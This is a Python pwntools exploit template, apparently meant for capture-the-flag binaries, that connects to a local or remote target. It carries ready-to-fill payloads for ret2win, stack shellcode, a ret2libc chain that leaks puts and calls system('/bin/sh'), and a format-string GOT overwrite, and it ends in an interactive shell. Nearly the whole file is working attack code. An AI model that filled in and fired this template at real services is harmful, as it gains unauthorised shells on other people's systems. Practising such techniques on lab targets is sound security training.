#!/usr/bin/env python3
"""
pwn_template.py — fill-in-the-blanks pwntools exploit skeleton.

  LOCAL=1 ./pwn_template.py            # run locally under gdb-friendly settings
  ./pwn_template.py HOST PORT          # fire at the remote service

Workflow:
  1. set BIN (and LIBC if ret2libc).
  2. find offset: run locally, send cyclic(200), read crash RIP, cyclic_find.
  3. pick the section matching checksec output, uncomment, fill addresses.
"""
import os, sys
from pwn import *

BIN  = "./vuln"
LIBC = "./libc.so.6"          # set if you need ret2libc; else leave, it's lazy-loaded
context.binary = ELF(BIN, checksec=False)
context.log_level = "info"    # "debug" to see bytes on the wire

def start():
    if len(sys.argv) >= 3:               # ./pwn_template.py host port  -> remote
        return remote(sys.argv[1], int(sys.argv[2]))
    if os.environ.get("GDB"):            # GDB=1 -> debug locally
        return gdb.debug(BIN, gdbscript="b main\nc")
    return process(BIN)                  # default: local process

e = context.binary
# libc = ELF(LIBC, checksec=False)       # uncomment for ret2libc

# --- 1. FIND OFFSET -----------------------------------------------------------
# io = start(); io.sendline(cyclic(200)); io.wait()
# core = io.corefile; print("RIP:", hex(core.fault_addr))
# OFFSET = cyclic_find(core.read(core.rsp, 8)); print("offset", OFFSET)
OFFSET = 0        # <-- set me

io = start()

# ============================================================================
# Pick ONE technique (match checksec):
# ============================================================================

# --- A. ret2win (a win()/giveshell() function exists) ------------------------
# payload = flat({OFFSET: e.sym.win})
# io.sendline(payload)

# --- B. shellcode on stack (NX disabled, no canary) -------------------------
# sc = asm(shellcraft.sh())
# nop = asm('nop') * (OFFSET - len(sc))
# payload = nop + sc + p64(STACK_ADDR_OF_BUFFER)
# io.sendline(payload)

# --- C. ret2libc (NX on, no PIE, libc known) --------------------------------
# rop = ROP(e)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# ret     = rop.find_gadget(['ret'])[0]
# # 1) leak puts@libc:
# payload  = flat({OFFSET: [pop_rdi, e.got['puts'], e.plt['puts'], e.sym.main]})
# io.sendline(payload)
# leak = u64(io.recvline().strip().ljust(8, b'\0'))
# libc.address = leak - libc.sym['puts']
# log.success(f"libc base: {hex(libc.address)}")
# # 2) system("/bin/sh"):
# binsh = next(libc.search(b"/bin/sh"))
# payload = flat({OFFSET: [ret, pop_rdi, binsh, libc.sym['system']]})
# io.sendline(payload)

# --- D. format string (overwrite GOT / leak) --------------------------------
# OFF = 6                                   # your input's stack offset ("AAAA %p %p"->41414141)
# payload = fmtstr_payload(OFF, {e.got['exit']: e.sym.win})
# io.sendline(payload)

# ============================================================================
io.interactive()
